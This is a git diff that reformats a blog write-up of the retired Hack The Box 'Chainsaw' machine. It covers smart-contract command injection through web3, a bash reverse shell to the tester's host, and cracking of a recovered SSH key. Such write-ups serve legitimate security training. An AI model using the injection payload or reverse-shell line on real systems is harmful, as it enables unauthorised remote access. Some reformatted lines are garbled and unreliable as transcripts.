@@ -1,23 +1,23 @@
 ---
 layout: post
-title:  "Hack The Box: 'Chainsaw' Writeup"
-image: ''
-date:   2019-11-23 00:11:43
+title: "Hack The Box: 'Chainsaw' Writeup"
+image: ""
+date: 2019-11-23 00:11:43
 tags:
-- hackthebox
-- blockchain
-- smart-contracts
-- linux
-- python
-- solidity
-- web3
-- manual-exploit
-- 64-bit binary
-- setuid
+  - hackthebox
+  - blockchain
+  - smart-contracts
+  - linux
+  - python
+  - solidity
+  - web3
+  - manual-exploit
+  - 64-bit binary
+  - setuid
 
-description: ''
+description: ""
 categories:
-- Hack The Box
+  - Hack The Box
 ---
 
 <style>
@@ -99,11 +99,13 @@ If you find anything in this writeup you feel is inaccurately depicted and/or ex
 ### Overview
 
 The `Chainsaw` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/41600">artikrh</a> and <a href="https://www.hackthebox.eu/home/users/profile/37317">absolutezero</a>) is a retired 40 point Linux machine. The initial steps require manual exploitation of smart contracts via a few files that can be found in an FTP share with `anonymous` login enabled. Once a shell has been obtained, there is a privilege escalation technique involving the InterPlanetary File System (`IPFS`) which leads to SSH key cracking (and eventually `user.txt`). For root, there is a 64-bit ELF setuid binary called `ChainsawClub` which can be exploited in a similar fashion to the first exploit.
+
 <p><br></p>
 With all of that being said... Time to get crackin'! 
 <p><br></p>
 
 As usual, I started with my initial `nmap` scan for general port discovery and service enumeration.
+
 <p><br></p>
 
 ### Nmap Scan
@@ -113,58 +115,58 @@ Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 13:36 EST
 Nmap scan report for 10.10.10.142
 Host is up (0.037s latency).
 
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 3.0.3
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| -rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-| -rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-|_-rw-r--r--    1 1001     1001           44 Nov 23 17:17 address.txt
-| ftp-syst: 
-|   STAT: 
+| -rw-r--r-- 1 1001 1001 23828 Dec 05 2018 WeaponizedPing.json
+| -rw-r--r-- 1 1001 1001 243 Dec 12 2018 WeaponizedPing.sol
+|_-rw-r--r-- 1 1001 1001 44 Nov 23 17:17 address.txt
+| ftp-syst:
+| STAT:
 | FTP server status:
-|      Connected to ::ffff:10.10.14.34
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 1
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp   open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
-|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
-|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
-9810/tcp open  unknown
-| fingerprint-strings: 
-|   FourOhFourRequest: 
-|     HTTP/1.1 400 Bad Request
-|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
-|     Access-Control-Allow-Origin: *
-|     Access-Control-Allow-Methods: *
-|     Content-Type: text/plain
-|     Date: Sat, 23 Nov 2019 18:37:25 GMT
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.1 400 Bad Request
-|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
-|     Access-Control-Allow-Origin: *
-|     Access-Control-Allow-Methods: *
-|     Content-Type: text/plain
-|     Date: Sat, 23 Nov 2019 18:37:24 GMT
-|     Connection: close
-|     Request
-|   HTTPOptions: 
-|     HTTP/1.1 200 OK
-|     Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
-|     Access-Control-Allow-Origin: *
-|     Access-Control-Allow-Methods: *
-|     Content-Type: text/plain
-|     Date: Sat, 23 Nov 2019 18:37:24 GMT
-|_    Connection: close
+| Connected to ::ffff:10.10.14.34
+| Logged in as ftp
+| TYPE: ASCII
+| No session bandwidth limit
+| Session timeout in seconds is 300
+| Control connection is plain text
+| Data connections will be plain text
+| At session startup, client count was 1
+| vsFTPd 3.0.3 - secure, fast, stable
+|\_End of status
+22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
+| 256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
+|_ 256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
+9810/tcp open unknown
+| fingerprint-strings:
+| FourOhFourRequest:
+| HTTP/1.1 400 Bad Request
+| Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
+| Access-Control-Allow-Origin: _
+| Access-Control-Allow-Methods: _
+| Content-Type: text/plain
+| Date: Sat, 23 Nov 2019 18:37:25 GMT
+| Connection: close
+| Request
+| GetRequest:
+| HTTP/1.1 400 Bad Request
+| Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
+| Access-Control-Allow-Origin: _
+| Access-Control-Allow-Methods: _
+| Content-Type: text/plain
+| Date: Sat, 23 Nov 2019 18:37:24 GMT
+| Connection: close
+| Request
+| HTTPOptions:
+| HTTP/1.1 200 OK
+| Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, User-Agent
+| Access-Control-Allow-Origin: _
+| Access-Control-Allow-Methods: _
+| Content-Type: text/plain
+| Date: Sat, 23 Nov 2019 18:37:24 GMT
+|\_ Connection: close
 </code></pre></div></div>
 
 ### FTP Enumeration
@@ -275,19 +277,19 @@ The contents of the files are as follows:
 `WeaponizedPing.sol`:
 
 ```javascript
-+[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.sol 
++[root@kali: HTB-CHAINSAW]$ cat WeaponizedPing.sol
 pragma solidity ^0.4.24;
 
-contract WeaponizedPing 
+contract WeaponizedPing
 {
   string store = "google.com";
 
-  function getDomain() public view returns (string) 
+  function getDomain() public view returns (string)
   {
       return store;
   }
 
-  function setDomain(string _value) public 
+  function setDomain(string _value) public
   {
       store = _value;
   }
@@ -302,7 +304,8 @@ contract WeaponizedPing
 
 ### WeaponizedPing File Contents & Analysis
 
-This appears to be exactly what is needed to produce a smart contract. These smart contracts are written in a language called Solidity -- most people tend to associate it with popular blockchain platforms, such as Ethereum. 
+This appears to be exactly what is needed to produce a smart contract. These smart contracts are written in a language called Solidity -- most people tend to associate it with popular blockchain platforms, such as Ethereum.
+
 <p><br></p>
 The file `WeaponizedPing.sol` appears to have two interesting functions as well, both of which are returning the same value (`store`).
 <p><br></p>
@@ -310,20 +313,20 @@ The file `WeaponizedPing.sol` appears to have two interesting functions as well,
 The first function is `getDomain()`. It returns the value of `store`, where the value of `store` is set to `google.com`.
 
 ```javascript
-contract WeaponizedPing 
+contract WeaponizedPing
 {
   string store = "google.com";
 
-  function getDomain() public view returns (string) 
+  function getDomain() public view returns (string)
   {
       return store;
   }
 ```
 
-The second function is `setDomain`, which takes the input of *some string value* (`_value`) and changes the original value of `store` to the new *some string value* (`_value`):
+The second function is `setDomain`, which takes the input of _some string value_ (`_value`) and changes the original value of `store` to the new _some string value_ (`_value`):
 
 ```javascript
-  function setDomain(string _value) public 
+  function setDomain(string _value) public
   {
       store = _value;
   }
@@ -332,6 +335,7 @@ The second function is `setDomain`, which takes the input of *some string value*
 ### Smart Contract Exploit Verification
 
 So from here, I began analyzing everything a bit further to get a better understanding of what all I was working with.
+
 <p><br></p>
 I started by importing required modules with `python`. I initially had to install `web3` 
 prior to importing it with python, so I went ahead and did that first:
@@ -347,11 +351,12 @@ from web3 import Web3, HTTPProvider
 ```
 
 After checking the Solidity documentation, I noticed I needed two things to interact with smart contracts:
+
 <p><br></p>
 
-1) The address of the contract (which I already found in `WeaponizedPing.json`)<br>
-2) The `ABI`, or *Application Binary Interface* of the contract
-<p><br></p>
+1. The address of the contract (which I already found in `WeaponizedPing.json`)<br>
+2. The `ABI`, or _Application Binary Interface_ of the contract
+   <p><br></p>
 
 I imported `json` because it is necessary to import the application binary interface as previously mentioned, which happens to be the `json` file (`WeaponizedPing.json`).
 
@@ -379,6 +384,7 @@ True
 ```
 
 So now that `web3.isConnected()` returned `True`, I began attempting to exploit the service.
+
 <p><br></p>
 
 ### Smart Contract Exploitation
@@ -387,20 +393,20 @@ I hop into a `python3` window and get started with building my exploit. I begin 
 
 ```python
 ➜  HTB-CHAINSAW python3
-Python 3.7.5 (default, Oct 27 2019, 15:43:29) 
+Python 3.7.5 (default, Oct 27 2019, 15:43:29)
 [GCC 9.2.1 20191022] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 +>>> from web3 import Web3, HTTPProvider
 +>>> import json
-+>>> 
++>>>
 +>>> # Basic configuration variables related to smart contract verification
-+... 
++...
 +>>> contract_address = '0xC727e70ded24b8D814627B53ce95cA4cF1d3e2C7'
 +>>> contract_data = json.loads(open("WeaponizedPing.json", "r").read())
 +>>> abi = contract_data['abi']
-+>>> 
++>>>
 +>>> # Connection gets established
-+... 
++...
 +>>> w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
 +>>> w3
 <web3.main.Web3 object at 0x7fd66445de90>
@@ -427,6 +433,7 @@ Or maybe the second one:
 ```
 
 Or even the thir-
+
 <p><br></p>
 
 You get the point. From here, I went ahead and set my `defaultAccount` to the very first address in the list:
@@ -436,9 +443,10 @@ You get the point. From here, I went ahead and set my `defaultAccount` to the ve
 ```
 
 Nice – So now, every time I perform a transaction, the address located at `w3.eth.accounts[0]` will be applied as the default sending address (aka, this address --> `0x661739A860ca8b1325eA416be0E0342d1990B798`)
+
 <p><br></p>
 
-This is great and all, but I can't really *call* anything yet. However, this is why I created the `abi` variable.
+This is great and all, but I can't really _call_ anything yet. However, this is why I created the `abi` variable.
 
 This will essentially "load" the API and allow me to interact with it. I can do this by running this command in `python`:
 
@@ -446,7 +454,7 @@ This will essentially "load" the API and allow me to interact with it. I can do 
 +>>> contract = w3.eth.contract(abi=abi, address=contract_address)
 ```
 
-And as you can see, checking the value of `contract ` gives me this result:
+And as you can see, checking the value of `contract` gives me this result:
 
 ```python
 +>>> contract
@@ -461,9 +469,11 @@ Looking good so far! Now I can try playing with the associated functions from `W
 ```
 
 Cool! It gives me the output `google.com`, which is exactly what I would expect, as that was already defined in the original source code.
+
 <p><br></p>
 
 So this got me thinking... Instead of using `getDomain()` to retrieve a domain, what if I were to use `setDomain` instead and try to ping myself? So that's exactly what I did.
+
 <p><br></p>
 
 I went ahead and ran `tcpdump` in order to (hopefully) receive a request back to myself via the smart contract exploit.
@@ -477,6 +487,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 ```
 
 An inferance can be made that, because the original file is called `WeaponizedPing`, it's likely that it will be accessible via ICMP.
+
 <p><br></p>
 
 Anyway, I then ran this command from my `python` prompt to retrieve a response:
@@ -497,6 +508,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 ```
 
 I knew I could get a response, but I wanted to verify this one step further.
+
 <p><br></p>
 
 I wanted to know if I could get command execution in a similar fashion. I attempted to do this by pinging myself directly with a similar command. I achieved this by running the same `tcpdump` command, but by changing my original smart contract command to this:
@@ -536,9 +548,10 @@ I've broken the responses up to make it more apparent, but as you can see, there
 ### Obtaining A Shell
 
 Now that I have crafted a working payload, I can attempt to obtain a shell given what I already know.
+
 <p><br></p>
 
-I opted for the "easy" route, and settled with a `bash` reverse shell. I set up a `netcat` listener on port `9001` with this command: 
+I opted for the "easy" route, and settled with a `bash` reverse shell. I set up a `netcat` listener on port `9001` with this command:
 
 ```python
 nc -lnvp 9001
@@ -575,9 +588,11 @@ administrator@chainsaw:/opt/WeaponizedPing$
 ```
 
 I managed to obtain a shell as `administrator`! I assumed I would be able to read `user.txt` at this point, but I was wrong... It appears there is a second user named `bobby`, which is likely the user with access to the `user.txt` file.
+
 <p><br></p>
 
 With this in mind, I decided I should probably start digging deeper... But I wanted a better shell first, so I generated my own ssh keypair to establish persistence as `administrator` prior to continuing with my enumeration.
+
 <p><br></p>
 
 #### Sidenote
@@ -598,7 +613,7 @@ url = "http://10.10.10.142:9810"
 w3 = Web3(HTTPProvider(url))
 w3.eth.defaultAccount = w3.eth.accounts[0]
 
-# Specify contract values 
+# Specify contract values
 contract = w3.eth.contract(abi=abi, address=cAddress) # enables 'functions' i.e. contracts.functions.<functionName>()
 contract.functions.setDomain("10.10.14.34; bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'").transact() # calls shell to listener
 ```
@@ -624,6 +639,7 @@ Now, back to having persistence as `administrator`!
 ### System Enumeration & User.txt
 
 Equipped with my new and improved SSH shell, I began sifting through directories to see what I could find.
+
 <p><br></p>
 
 Upon navigating to `/home/administrator`, I found an interesting folder called `maintain`:
@@ -741,6 +757,7 @@ Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV
 
 I began running `ipfs ls <hash>` in an attempt to obtain some more information. Through quite a few phases of trial and error, I landed on this particular hash:
 `QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri`
+
 <p><br></p>
 
 Which returned multiple `.eml` files:
@@ -765,7 +782,7 @@ This will lead to the `.eml` files being displayed, similarly to the above examp
 I was only interested in the one belonging to `bobby` (for obvious reasons), so I used `ipfs get <hash>` in order to grab the file:
 
 ```python
-administrator@chainsaw:~/.ipfs$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
+administrator@chainsaw:~/.ipfs$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
 Saving file(s) to QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
  4.53 KiB / 4.53 KiB [=====================================================================] 100.00% 0s
 administrator@chainsaw:~/.ipfs$ ls -al
@@ -784,7 +801,7 @@ drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
 I went ahead and viewed the file afterwards:
 
 ```python
-administrator@chainsaw:~/.ipfs$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
+administrator@chainsaw:~/.ipfs$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
 X-Pm-Origin: internal
 X-Pm-Content-Encryption: end-to-end
 Subject: Ubuntu Server Private RSA Key
@@ -895,6 +912,7 @@ UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
 ```
 
 As expected, the private key was decoded with `base64` without any problems. However, it still appears to be encrypted, which is a bit of an issue. I decided I would combat this by utilizing `ssh2john` to obtain the hash of the key in a format recognizable by `john the ripper`, which I would then be able to crack accordingly with `rockyou.txt`.
+
 <p><br></p>
 
 I started the hash conversion:
@@ -928,11 +946,10 @@ Session completed
 I was then able to SSH as `bobby` and `cat user.txt`!
 
 ```css
-➜  HTB-CHAINSAW chmod 600 bobby.key.enc
+➜HTB-CHAINSAW chmod 600 bobby.key.enc
 ➜  HTB-CHAINSAW ssh -i bobby.key.enc bobby@chainsaw.htb
-Enter passphrase for key 'bobby.key.enc': jackychain
-bobby@chainsaw:~$ cat /home/bobby/user.txt
-af8d9df991cc[REDACTED...]
+Enter passphrase for key 'bobby.key.enc': jackychain bobby @chainsaw:~$ cat /
+  home/bobby/user.txt af8d9df991cc[REDACTED...];
 ```
 
 ### ChainsawClub File Analysis
@@ -974,11 +991,12 @@ bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub
 [*] Entry based on merit.
 
 Username: farbs
-Password: 
+Password:
 [*] Wrong credentials!
 ```
 
 Looks like we're going to be doing some more smart contract exploitation! Digging deeper, I decided to take a look at the `Chainsaw.sol` file to get an idea of the functions I was working with:
+
 <p><br></p>
 
 `ChainsawClub.sol`:
@@ -1042,9 +1060,11 @@ string password = '7b455ca1ffcb9f3828cfdde4a396139e';
 ```
 
 At this point, I also noticed the `setApprove()` function, which I imagined would need to be set from `false` to `true`. There was also the `transfer()` function, which I assumed is used to transfer coins.
+
 <p><br></p>
 
 I initially tried bypassing the constraints with the provided username `nobody` and the password hash, but it didn't work. I also tried cracking the `md5` hash with Crackstation as well as with `john`, but that didn't work either. I noticed an `address.txt` file was generated after running the `ChainsawClub` binary as well. So, I created my own account called `farbs` to do some further testing.
+
 <p><br></p>
 
 Upon creating my user, I was able to log in, but I received an error every time I tried to do anything:
